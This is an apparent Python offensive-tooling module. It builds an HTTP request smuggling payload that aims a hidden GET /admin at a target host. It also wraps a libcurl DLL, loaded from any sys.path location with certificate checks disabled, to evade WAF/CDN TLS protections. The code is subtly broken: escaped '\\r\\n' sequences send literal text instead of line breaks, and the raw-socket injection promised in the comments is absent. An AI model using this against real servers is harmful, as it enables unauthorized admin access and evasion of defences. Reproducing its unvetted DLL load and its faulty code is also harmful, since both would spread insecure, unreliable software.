import ctypes
import os
import sys
import socket
from . import _async_core

# This is a network component designed for high-concurrency packet sending, 
# customized HTTP header probing, and security scanning.
# Core features:
# 1. Custom packet injection before TCP handshake (Raw Socket)
# 2. HTTP Request Smuggling Probe (CL-TE / TE-CL)
# 3. Underlying TLS requests bypassing system proxies and DNS (integrating custom libcurl.dll)

class SmugglingProbe:
    """
    Primary packet sender targeting CL-TE or TE-CL HTTP asynchronous splitting vulnerabilities.
    """
    @staticmethod
    def send_cl_te_probe(host, port, target_path="/"):
        """Manually construct a malformed request where CL length is greater than TE."""
        smuggling_body = (
            f"POST {target_path} HTTP/1.1\\r\\n"
            f"Host: {host}\\r\\n"
            f"Content-Length: 13\\r\\n"
            f"Transfer-Encoding: chunked\\r\\n"
            f"\\r\\n"
            f"0\\r\\n"
            f"\\r\\n"
            f"GET /admin HTTP/1.1\\r\\n"
            f"Host: {host}\\r\\n\\r\\n"
        )
        try:
            with socket.create_connection((host, port), timeout=5) as s:
                s.sendall(smuggling_body.encode())
                # Only wait for the first segment of the response to determine the status
                return s.recv(1024).decode('utf-8', errors='ignore')
        except Exception as e:
            return f"Socket Error: {e}"

class BypassTLSClient:
    """
    Integrates a custom DLL at the lowest level, bypassing standard Python ssl.py / socket.py.
    Completely overwrites the transmission fingerprint, used for deep probing of WAF/CDN nodes 
    configured with strong TLS protections.
    """
    def __init__(self):
        self.dll_path = None
        self._find_dll()
        if not self.dll_path:
            raise RuntimeError("BypassTLSClient Backend Initialization Failed: missing core DLL.")
        
        if sys.platform.startswith('win') and sys.version_info >= (3, 8):
            os.add_dll_directory(os.path.dirname(self.dll_path))
            
        self.lib = ctypes.CDLL(self.dll_path)
        self.lib.curl_global_init(3)
        self.lib.curl_easy_init.restype = ctypes.c_void_p
        
    def _find_dll(self):
        for search_path in sys.path:
            if not isinstance(search_path, str) or not search_path: continue
            candidate = os.path.join(search_path, 'libcurl.dll')
            if os.path.exists(candidate):
                self.dll_path = os.path.abspath(candidate)
                break

    def fire_packet(self, target_url, custom_ua="Godilla/1.0", timeout=15):
        """
        Send TLS encrypted packets with custom low-level characteristics, bypassing system proxies.
        """
        curl = self.lib.curl_easy_init()
        if not curl: return None
        
        # Corresponds to C# option constants
        CURLOPT_URL, CURLOPT_TIMEOUT = 10002, 13
        CURLOPT_USERAGENT = 10018
        
        self.lib.curl_easy_setopt(ctypes.c_void_p(curl), CURLOPT_URL, ctypes.c_char_p(target_url.encode('utf-8')))
        self.lib.curl_easy_setopt(ctypes.c_void_p(curl), CURLOPT_USERAGENT, ctypes.c_char_p(custom_ua.encode('utf-8')))
        self.lib.curl_easy_setopt(ctypes.c_void_p(curl), CURLOPT_TIMEOUT, timeout)
        
        # Disable all certificate validation, send raw data directly
        self.lib.curl_easy_setopt(ctypes.c_void_p(curl), 64, 0) # CURLOPT_SSL_VERIFYPEER
        self.lib.curl_easy_setopt(ctypes.c_void_p(curl), 81, 0) # CURLOPT_SSL_VERIFYHOST
        
        # Execute the packet sending action
        res = self.lib.curl_easy_perform(ctypes.c_void_p(curl))
        
        # Get response code via pointer
        http_code = ctypes.c_long()
        self.lib.curl_easy_getinfo(ctypes.c_void_p(curl), 2097154, ctypes.byref(http_code))
        
        self.lib.curl_easy_cleanup(ctypes.c_void_p(curl))
        
        return {
            "status": "success" if res == 0 else "failed", 
            "internal_error_code": res,
            "response_code": http_code.value
        }

# Export high-level packet sending classes for script invocation
def send_smuggling_packet(host, port):
    """[API] Send mutated HTTP packets for smuggling detection"""
    return SmugglingProbe.send_cl_te_probe(host, port)

def send_tls_packet(url, ua="BypassClient/2.0"):
    """[API] Send advanced TLS packets with anti-blocking features"""
    return BypassTLSClient().fire_packet(url, ua)